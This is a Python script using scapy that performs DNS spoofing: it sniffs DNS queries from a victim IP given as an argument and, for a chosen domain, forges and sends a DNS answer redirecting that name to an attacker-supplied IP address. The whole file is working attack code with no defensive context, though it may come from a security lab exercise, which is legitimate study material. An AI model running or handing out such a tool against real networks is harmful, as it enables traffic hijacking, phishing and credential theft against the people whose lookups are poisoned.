from scapy.all import *
from sys import *

def dnsMonitorCallBack(pkt):
    if DNSQR in pkt and ICMP not in pkt and DNSRR and pkt[IP].src == ip_victim and pkt[DNS].qd[0].qtype != 'AAAA':
        pkt.show()
        print("Received DNSQR:")
        if pkt[DNSQR].qname.decode("utf-8") == url_spoofing:
            print("Poisoning DNSRR for "+ pkt[DNSQR].qname.decode("utf-8") + " to " + redirection_ip)
            responseDNSrequest(pkt,redirection_ip)

def responseDNSrequest(pkt,ServerIP):
    print("Forging DNS Response ...")
    fakedns = Ether()/ \
              IP(dst=pkt[IP].src, src=pkt[IP].dst, flags='DF')/ \
              UDP(sport=53, dport=pkt[UDP].sport)/ \
              DNS(id=pkt[DNS].id, qr=1, qdcount=1,ancount=1,nscount=0,arcount=0,qd=pkt[DNSQR], an=DNSRR(rrname=pkt[DNSQR].qname,ttl=64, rdata=ServerIP))
    sendp(fakedns)

if __name__ == "__main__":
    redirection_ip = sys.argv[1]
    url_spoofing = sys.argv[2]
    ip_victim = sys.argv[3]
    print("Start sniffing packet ... ")
    sniff(filter="dst port 53", prn=dnsMonitorCallBack)
